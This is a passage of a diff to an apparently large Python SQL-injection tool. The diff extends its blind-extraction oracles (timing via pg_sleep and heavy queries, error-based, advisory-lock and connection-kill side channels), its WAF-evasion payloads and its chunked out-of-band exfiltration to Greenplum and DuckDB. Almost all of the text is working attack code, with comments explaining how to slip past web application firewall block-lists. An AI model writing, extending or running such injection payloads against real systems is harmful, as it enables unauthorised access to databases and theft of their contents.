                 p1 = self._build_stacked(f"SELECT COUNT(*) FROM {_tbl} a,{_tbl} b WHERE get_bit('A'::bytea,1)=1")
@@ -145253,7 +145829,7 @@ class MultiStrategyExtractor:
         if not self._stacked:
             return False
         _methods = []
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             _methods = [
                 ("cancel",    self._build_stacked("SELECT pg_cancel_backend(pg_backend_pid())")),
                 ("terminate", self._build_stacked("SELECT pg_terminate_backend(pg_backend_pid())")),
@@ -145281,7 +145857,7 @@ class MultiStrategyExtractor:
         return False
 
     async def _eval_reset(self, cond):
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             p = self._build_stacked(f"SELECT CASE WHEN ({cond}) THEN pg_terminate_backend(pg_backend_pid()) END")
         elif self.dbms in ("MSSQL",):
             p = self._build_stacked(f"IF ({cond}) KILL @@SPID")
@@ -145337,7 +145913,7 @@ class MultiStrategyExtractor:
     # ORACLE 7: ADVISORY LOCK  lock contention oracle
     # 
     async def _probe_advisory(self):
-        if not self._stacked or self.dbms not in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if not self._stacked or self.dbms not in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             return False
         _tbl = self._HEAVY_FROM.get(self.dbms, "pg_class")
         try:
@@ -145372,6 +145948,8 @@ class MultiStrategyExtractor:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -145425,7 +146003,7 @@ class MultiStrategyExtractor:
             if _all_nums and _all_nums[0][2] > 2:
                 _ns, _ne, _nv = _all_nums[0]
                 _pre, _suf = _det_no_comments[:_ns], _det_no_comments[_ne:]
-                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     _num_true = _pre + f"(1>0)::int*{_nv}" + _suf
                     _num_false = _pre + f"(1>2)::int*{_nv}" + _suf
                     _num_cond = _pre + "({cond})::int*" + str(_nv) + _suf
@@ -145480,7 +146058,7 @@ class MultiStrategyExtractor:
                     
                     # Build DBMS-specific timing payloads
                 _stk_payloads = []
-                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     _stk_payloads = [
                         ("stk_sleep",   f"{_stk_prefix}SELECT pg_sleep({{cond_expr}}){_stk_suffix}",
                                         "({cond})::int*5", "(1>0)::int*5", "(1>2)::int*5"),
@@ -145733,6 +146311,8 @@ class MultiStrategyExtractor:
                     "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "MySQL":           "ISNULL(NULL)",
                     "MariaDB":         "ISNULL(NULL)",
                     "TiDB":            "ISNULL(NULL)",
@@ -145752,6 +146332,8 @@ class MultiStrategyExtractor:
                     "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                     "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                     "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                     "MySQL":           "ISNULL(1e0)",
                     "MariaDB":         "ISNULL(1e0)",
                     "TiDB":            "ISNULL(1e0)",
@@ -146095,7 +146677,7 @@ class MultiStrategyExtractor:
                           f"(true→{r1}, false→{r2}) — dropping", flush=True)
                     continue
                 # Round 2: real extraction-style condition
-                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     # BUG-PG-DOLLAR-QUOTE FIX (MEDIUM-HIGH, PostgreSQL/CockroachDB/YugabyteDB/
                     # Amazon Redshift, MSE oracle validation, all extraction techniques):
                     # The previous conditions used PostgreSQL dollar-quoting ($$...$$):
@@ -146483,6 +147065,8 @@ class MultiStrategyExtractor:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -146509,7 +147093,7 @@ class MultiStrategyExtractor:
             if not fn:
                 continue
             if self._stacked:
-                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     _test_p = self._build_stacked("SELECT pg_sleep(2)")
                 elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
                     # BUG-MSE-WAFDISCOVERY-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP() valid.
@@ -146587,6 +147171,8 @@ class MultiStrategyExtractor:
                     "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                    "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                     "MySQL":           "ISNULL(NULL)",
                     "MariaDB":         "ISNULL(NULL)",
                     "TiDB":            "ISNULL(NULL)",
@@ -146630,7 +147216,7 @@ class MultiStrategyExtractor:
         # Fix: dispatch both identifier delimiter AND row-limit clause per DBMS.
         if self.dbms in ("MSSQL", "Sybase"):
             sep, _sep_close = '[', ']'
-        elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             sep, _sep_close = '"', '"'
         elif self.dbms == "Oracle":
             sep, _sep_close = '"', '"'
@@ -146659,7 +147245,7 @@ class MultiStrategyExtractor:
         for cn in _common:
             if self._stacked and "sleep_arith" in self._oracles:
                 _t = self._sleep_info.get("t", 3)
-                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     p = self._build_stacked(
                         f"SELECT pg_sleep(({sep}{cn}{_sep_close} IS NOT NULL)::int * {_t}) "
                         f"FROM {sep}{table}{_sep_close} LIMIT 1")
@@ -146774,7 +147360,7 @@ class MultiStrategyExtractor:
         if not prefix:
             if self.dbms == "Oracle":
                 _mse_lenf = f"NVL(LENGTHC({expr}),0)"
-            elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            elif self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 _mse_lenf = f"COALESCE(CHAR_LENGTH({expr}),0)"
             elif self.dbms in ("MSSQL", "Sybase"):
                 _mse_lenf = f"ISNULL(LEN(CONVERT(NVARCHAR(MAX),{expr})),0)"
@@ -146820,6 +147406,8 @@ class MultiStrategyExtractor:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -147017,7 +147605,7 @@ class MultiStrategyExtractor:
                 # is a plain integer binary-search ceiling; never placed in SQL delimiters.
                 _cbs_char_hi = (65535 if self.dbms in ("MSSQL", "Sybase")
                                 else 1114111 if self.dbms == "SQLite"
-                                else 126   if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
+                                else 126   if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB")
                                 else 65535 if self.dbms in ("MySQL", "MariaDB", "TiDB", "Oracle")  # BUG-V157-MSE-CHARSET-CEIL-MYSQL-ORACLE FIX
                                 else 255)
                 lo, hi = ord('z') + 1, _cbs_char_hi   # above lowercase; covers full DBMS range
@@ -147101,7 +147689,7 @@ class MultiStrategyExtractor:
         # consistent: MySQL/MariaDB/TiDB/Oracle → 65535. Numeric safety: plain integer.
         _confirm_char_hi = (65535 if self.dbms in ("MSSQL", "Sybase")
                             else 1114111 if self.dbms == "SQLite"
-                            else 126   if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
+                            else 126   if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB")
                             else 65535 if self.dbms in ("MySQL", "MariaDB", "TiDB", "Oracle")  # BUG-V157-MSE-CHARSET-CEIL-MYSQL-ORACLE FIX
                             else 255)
         if lo < _confirm_char_hi:
@@ -147122,7 +147710,7 @@ class MultiStrategyExtractor:
             # be consistent: MySQL/MariaDB/TiDB/Oracle → 65535. Numeric safety: plain integer.
             _retry_char_hi = (65535 if self.dbms in ("MSSQL", "Sybase")
                               else 1114111 if self.dbms == "SQLite"
-                              else 126   if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
+                              else 126   if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB")
                               else 65535 if self.dbms in ("MySQL", "MariaDB", "TiDB", "Oracle")  # BUG-V157-MSE-CHARSET-CEIL-MYSQL-ORACLE FIX
                               else 255)
             # BUG-MSE-RETRY-LO-INIT FIX (v71): lo2_init was 32. Root Cause: identical to
@@ -147193,7 +147781,7 @@ class MultiStrategyExtractor:
         # semantics, but a DBMS-native LENGTH() condition is definitive. Use LENGTH first.
         _length = 0
         _len_expr = None  # DBMS-specific length expression, built once and reused
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             _len_expr = f"COALESCE(CHAR_LENGTH({expr}),0)"
         elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
             # BUG-MSE-LEN-TIDB FIX: TiDB was missing from the MySQL/MariaDB CHAR_LENGTH
@@ -147294,7 +147882,7 @@ class MultiStrategyExtractor:
         elif self.dbms in ("MSSQL", "Sybase"):
             sep, _sep_close = '[', ']'
         elif self.dbms in ("Oracle", "PostgreSQL", "CockroachDB", "YugabyteDB",
-                           "Amazon Redshift", "SQLite"):
+                           "Amazon Redshift", "SQLite", "Greenplum", "DuckDB"):
             # FIX-IDENT-QUOTING: Oracle/PG/SQLite use double-quotes for identifiers.
             # Without quoting, reserved-word column/table names (e.g. "table", "select",
             # "user", "order") raise ORA-00904 / PG syntax error on every extraction probe.
@@ -147314,6 +147902,7 @@ class MultiStrategyExtractor:
         _use_from = ("sleep_arith" in self._oracles and
                      self._stacked and
                      self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                                   "Greenplum", "DuckDB",
                                    "MySQL", "MariaDB", "TiDB"))  # BUG-MSE-FROM-TIDB FIX: TiDB is MySQL-wire-compatible, supports stacked queries and sleep_arith
 
         # BUG-EFT-PAGINATION FIX: Build DBMS-specific row-at-offset subquery for the non-timing
@@ -147327,7 +147916,7 @@ class MultiStrategyExtractor:
             _tbl = f"{sep}{table}{_sep_close}"
             _col = col_expr
             if self.dbms in ("MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "SQLite",
-                             "H2", "SAP_HANA", "ClickHouse", "DuckDB"):  # BUG-MSE-ROWSUBQ-TIDB FIX: TiDB supports LIMIT/OFFSET syntax identical to MySQL
+                             "H2", "SAP_HANA", "ClickHouse", "DuckDB", "Greenplum"):  # BUG-MSE-ROWSUBQ-TIDB FIX: TiDB supports LIMIT/OFFSET syntax identical to MySQL
                 return f"(SELECT {_col} FROM {_tbl} LIMIT 1 OFFSET {offset})"
             elif self.dbms in ("MSSQL", "Sybase"):
                 # OFFSET/FETCH requires ORDER BY; use (SELECT NULL) as a stable sort key.
@@ -147368,6 +147957,8 @@ class MultiStrategyExtractor:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -147420,7 +148011,7 @@ class MultiStrategyExtractor:
             _test_za1 = prefix + chr(ord('z') + 1)  # chr(123) = '{'
             if _use_from:
                 _t = self._sleep_info["t"]
-                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     _p_a = self._build_stacked(
                         f"SELECT pg_sleep(({sep}{col}{_sep_close}>={self._quote_val(_test_a)})::int * {_t}) "
                         f"FROM {sep}{table}{_sep_close} LIMIT 1 OFFSET {offset}")
@@ -147465,7 +148056,7 @@ class MultiStrategyExtractor:
 
                 if _use_from:
                     _t = self._sleep_info["t"]
-                    if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                    if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                         p = self._build_stacked(
                             f"SELECT pg_sleep(({sep}{col}{_sep_close}>={val})::int * {_t}) "
                             f"FROM {sep}{table}{_sep_close} LIMIT 1 OFFSET {offset}")
@@ -147811,7 +148402,7 @@ class SideChannelExtractor:
 
         # Define error trigger strategies per DBMS
         _strategies = []
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             if self._stacked:
                 _strategies = [
                     # Strategy 1: No-WHERE arithmetic (eliminates WHERE keyword entirely)
@@ -148281,7 +148872,8 @@ class SideChannelExtractor:
           MySQL/MariaDB/TiDB: HEX string comparison on CONV output
         """
         if _waf_bypass:
-            if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                             "Greenplum", "DuckDB"):
                 # BUG-WE-ORDINAL-WAF-BLOCK FIX: BYTEA byte-comparison avoids ASCII()/COALESCE()
                 # ordinal function names blocked by WAFs as extraction signatures.
                 # BYTEA comparison is collation-neutral: UTF-8 byte ordering matches Unicode
@@ -148299,6 +148891,11 @@ class SideChannelExtractor:
                 # which is functionally identical but not in extraction-function block-lists.
                 # BUG-BYTEA-SURROGATE FIX: threshold can fall in surrogate range (0xD800–0xDFFF)
                 # when binary search spans full Unicode; surrogatepass prevents UnicodeEncodeError.
+                # BUG-CHARDORD-WAF-GREENPLUM-DUCKDB FIX (HIGH): Greenplum and DuckDB were absent
+                # from the BYTEA WAF-bypass branch → fell to standard path below (ASCII/COALESCE)
+                # which the WAF was already blocking (that's why _we_ordinal_blocked=True).
+                # Both Greenplum (PG fork) and DuckDB support ::BYTEA casting and decode('hex','hex')
+                # identically to PostgreSQL. Adding them here ensures WAF-bypass mode works.
                 _utf8_hex = chr(threshold).encode("utf-8", errors="surrogatepass").hex()
                 if self.dbms == "Amazon Redshift":
                     return (f"RIGHT(LEFT(({expr}),{pos}),1)::BYTEA"
@@ -148562,10 +149159,15 @@ class SideChannelExtractor:
         # BUG-SCE-WE-PG-CEIL-FIX: PostgreSQL/CockroachDB/YugabyteDB/Amazon Redshift/
         # MySQL/MariaDB/TiDB all support full Unicode (0-1,114,111) in string comparisons.
         # Oracle BMP ceiling matches its string collation (0-65535).
+        # BUG-SCE-WE-GREENPLUM-DUCKDB-CHAR-HI FIX (HIGH): Greenplum and DuckDB were
+        # absent from the 1,114,111 branch → fell to 255 → any character with codepoint
+        # > 255 (accented, CJK, Cyrillic, Arabic, €, emoji) converges to chr(255)='ÿ'.
+        # Both are PG-compatible and support full Unicode (ASCII() returns full codepoint).
         _sce_we_char_hi = (65535 if self.dbms in ("MSSQL", "Sybase", "Oracle")
                            else 1114111 if self.dbms in (
                                "SQLite", "PostgreSQL", "CockroachDB", "YugabyteDB",
-                               "Amazon Redshift", "MySQL", "MariaDB", "TiDB")
+                               "Amazon Redshift", "MySQL", "MariaDB", "TiDB",
+                               "Greenplum", "DuckDB")
                            else 255)
         # BUG-SCE-BYTEA-BSEARCH-CEILING: In BYTEA bypass mode (_we_ordinal_blocked=True),
         # _char_ord_cond encodes the threshold as UTF-8 hex (e.g. threshold=557055 →
@@ -148751,6 +149353,16 @@ class SideChannelExtractor:
         elif self.dbms == "Oracle":
             expr = (f"(SELECT {column} FROM "
                     f"(SELECT {column},ROWNUM _r FROM {table}) WHERE _r={offset+1})")
+        # BUG-ETC-DB2-FIREBIRD-LIMIT FIX (MEDIUM): DB2 and Firebird do not support
+        # LIMIT/OFFSET syntax. DB2 uses FETCH FIRST ... ROWS ONLY (OFFSET requires DB2
+        # 11.1+). Firebird uses SELECT FIRST n SKIP m syntax.
+        # Without this, every extract_table_column call on DB2/Firebird raises a SQL
+        # syntax error → extract_where_error returns "" for all OOB column extractions.
+        elif self.dbms == "DB2":
+            expr = (f"(SELECT {column} FROM {table} "
+                    f"ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)")
+        elif self.dbms == "Firebird":
+            expr = f"(SELECT FIRST 1 SKIP {offset} {column} FROM {table})"
         else:
             expr = f"(SELECT {column} FROM {table} LIMIT 1 OFFSET {offset})"
         return await self.extract_where_error(expr, max_len=max_len)
@@ -148834,7 +149446,7 @@ class SideChannelExtractor:
         # Helper: quote a literal string for the target DBMS
         def _q(s):
             """Return SQL string literal appropriate for current DBMS."""
-            if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 return f"$${s}$$"
             else:
                 # Single-quote with doubled-quote escaping (works for MySQL/MSSQL/Oracle/etc)
@@ -148857,7 +149469,7 @@ class SideChannelExtractor:
         # for the specific fields extracted here).
         _OOB_PG_CHUNK_SIZE = 30   # bytes per chunk (leaves 2 chars for chunk index)
         _OOB_PG_MAX_CHUNKS = 4    # 4 × 30 = 120 bytes max
-        _chunked_oob = self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
+        _chunked_oob = self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB")
         if _chunked_oob:
             # BUG-PGSQL-NONSTACK-EXFIL FIX: For non-stacked detections (B/E/T),
             # self._prefix = "'  " so "{prefix}SELECT dblink_connect_u(...)" becomes
@@ -149357,7 +149969,7 @@ class SideChannelExtractor:
 
     async def probe_lock_contention(self):
         """Test advisory lock contention channel."""
-        if self.dbms not in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms not in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             return False
         if not self._stacked:
             return False
@@ -149526,10 +150138,15 @@ class SideChannelExtractor:
         # PostgreSQL-only (pg_advisory_lock is a PG function) so practically this would
         # never reach MSSQL/SQLite, but using the correct ceiling is correct regardless.
         # BUG-SCE-LC-CEIL-FIX: add YugabyteDB and Amazon Redshift to 1114111 group.
+        # BUG-SCE-LC-GREENPLUM-DUCKDB-CHAR-HI FIX (MEDIUM): Greenplum and DuckDB absent
+        # from 1114111 branch → fell to 255 → multi-byte chars converge to chr(255).
+        # Greenplum is a PG fork and supports pg_advisory_lock; DuckDB does not but
+        # correct ceiling prevents corruption for any future code path that reaches here.
         _sce_lc_char_hi = (65535   if self.dbms in ("MSSQL", "Sybase")
                            else 1114111 if self.dbms in (
                                "SQLite", "PostgreSQL", "CockroachDB",
-                               "YugabyteDB", "Amazon Redshift")
+                               "YugabyteDB", "Amazon Redshift",
+                               "Greenplum", "DuckDB")
                            else 255)
 
         for pos in range(1, max_len + 1):
@@ -149649,7 +150266,7 @@ class SideChannelExtractor:
 
     async def probe_connection_kill(self):
         """Test conditional connection termination."""
-        if self.dbms not in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms not in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             return False
         if not self._stacked:
             return False
@@ -149778,7 +150395,7 @@ class SideChannelExtractor:
 
     async def probe_large_object(self):
         """Test if conditional large object creation produces observable signal."""
-        if self.dbms not in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if self.dbms not in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             return False
         if not self._stacked:
             return False
@@ -149886,7 +150503,7 @@ class SideChannelExtractor:
                         self._error_strategy = "where_div"
                 else:
                     if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB",
-                                     "Amazon Redshift"):
+                                     "Amazon Redshift", "Greenplum", "DuckDB"):
                         self._error_strategy = "arith_inline"
                     elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
                         # BUG-SCE-TIDB-CH3-STRATEGY FIX: TiDB missing from MySQL/MariaDB
@@ -149957,10 +150574,13 @@ class SideChannelExtractor:
         # methods extract_where_error() and extract_table_column() already use this
         # per-DBMS ceiling formula; this method was the only one that was missed.
         # BUG-SCE-EW-PG-CEIL-FIX: add PostgreSQL-family and MySQL-family to 1114111 group.
+        # BUG-SCE-EW-GREENPLUM-DUCKDB-CHAR-HI FIX (HIGH): Greenplum and DuckDB absent →
+        # fell to 255 → characters with codepoint > 255 converge to chr(255)='ÿ'.
         _sce_ew_char_hi = (65535   if self.dbms in ("MSSQL", "Sybase", "Oracle")
                            else 1114111 if self.dbms in (
                                "SQLite", "PostgreSQL", "CockroachDB", "YugabyteDB",
-                               "Amazon Redshift", "MySQL", "MariaDB", "TiDB")
+                               "Amazon Redshift", "MySQL", "MariaDB", "TiDB",
+                               "Greenplum", "DuckDB")
                            else 255)
         for pos in range(1, max_len + 1):
             # BUG-SCE-EW-LO-INIT-V2 FIX: lo=32 causes EOS to converge to space instead of 0;
@@ -150034,7 +150654,7 @@ class ExtractionBypassFinder:
         Tx = f"0x{T:x}"          # hex form, e.g. 0x5
         T0 = "0"; T0x = "0x0"
 
-        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             return [
                 #  Arithmetic inside pg_sleep (HIGHEST PRIORITY) 
                 # Condition is INSIDE pg_sleep() argument  not in CASE WHEN or WHERE.
@@ -150401,6 +151021,8 @@ class ExtractionBypassFinder:
             "CockroachDB":    "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift":"ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":          "ISNULL(NULL)",
             "MariaDB":        "ISNULL(NULL)",
             "TiDB":           "ISNULL(NULL)",
@@ -150420,6 +151042,8 @@ class ExtractionBypassFinder:
             "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "MySQL":          "ISNULL(1e0)",
             "MariaDB":        "ISNULL(1e0)",
             "TiDB":           "ISNULL(1e0)",
@@ -151060,7 +151684,8 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             _mssql_mm = _t_int_mssql // 60
             _mssql_ss = _t_int_mssql % 60
             return f"{_mssql_pfx} IF ({condition}) BEGIN WAITFOR DELAY '0:{_mssql_mm:02d}:{_mssql_ss:02d}' END{_tp_sfx}"
-        elif dbms in ("PostgreSQL", "CockroachDB", "Amazon Redshift", "YugabyteDB"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "Amazon Redshift", "YugabyteDB",
+                      "Greenplum", "DuckDB"):
             # BUG FIX: pg_sleep() returns void  `IS NOT NULL` on void is unreliable
             # in older PG versions and causes "function returning void cannot be used here".
             # Correct form: wrap in a subquery that casts to text so IS NOT NULL works.
@@ -151071,6 +151696,16 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # not exist in YugabyteDB → SQL error → fast response → timing oracle fails
             # → empty extraction on ALL YugabyteDB T/TH/HQ sessions. Same fix pattern
             # as v117 BUG-ITO-CRDB-YG-SYBASE-BRANCH for _inline_timing_oracle.
+            # BUG-TBEXTRACT-GREENPLUM-DUCKDB-SLEEP FIX (HIGH; Greenplum/DuckDB;
+            # _time_based_extract_inner.timing_payload; T/TH/HQ; all surfaces):
+            # Greenplum and DuckDB were absent from the PostgreSQL-family branch and
+            # fell to `else: IF(cond,SLEEP(t),0)` — MySQL-only syntax that does not
+            # exist in either DBMS → SQL error on every timing probe → fast response →
+            # oracle always False → binary search converges to lo=0 → empty extraction.
+            # Greenplum is a PostgreSQL fork and uses pg_sleep() identically. DuckDB
+            # supports pg_sleep() as confirmed by ZKBooleanExtractor._sleep_expr which
+            # already routes both through pg_sleep(). Fix: add both to this branch so
+            # timing_payload() uses the correct pg_sleep()/generate_series() form.
             # FIX-PG-SLEEP-VOID: pg_sleep() returns void; IS NOT NULL on void is
             # unreliable (raises "function returning void cannot be used here" on some PG
             # versions). Cast to TEXT so the CASE expression has a non-void type.
@@ -151081,7 +151716,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # large N causes CPU load proportional to N without triggering sleep-based
             # WAF rules. CockroachDB and YugabyteDB also support generate_series().
             # Amazon Redshift does NOT support generate_series — fall through to pg_sleep.
-            if _tp_technique == 'HQ' and dbms != "Amazon Redshift":
+            if _tp_technique == 'HQ' and dbms not in ("Amazon Redshift",):
                 _hq_rows = max(1_000_000, min(int(t * 1_000_000), 10_000_000))
                 # FIX: Use IS NOT NULL instead of >0 — WAF blocks the '>' comparison operator
                 # at the outer level. count(*) IS NOT NULL is always TRUE but avoids the '>'
@@ -151188,7 +151823,17 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
     if dbms == "Oracle":
         substr = "SUBSTR"
     else:
-        substr = "SUBSTRING" if dbms in ("MSSQL", "PostgreSQL", "CockroachDB", "Amazon Redshift") else "SUBSTR"
+        # BUG-TBEXTRACT-SUBSTR-PG-FAMILY FIX (MEDIUM; YugabyteDB/Greenplum/DuckDB;
+        # _time_based_extract_inner; T/TH/HQ; all surfaces; all HTTP methods):
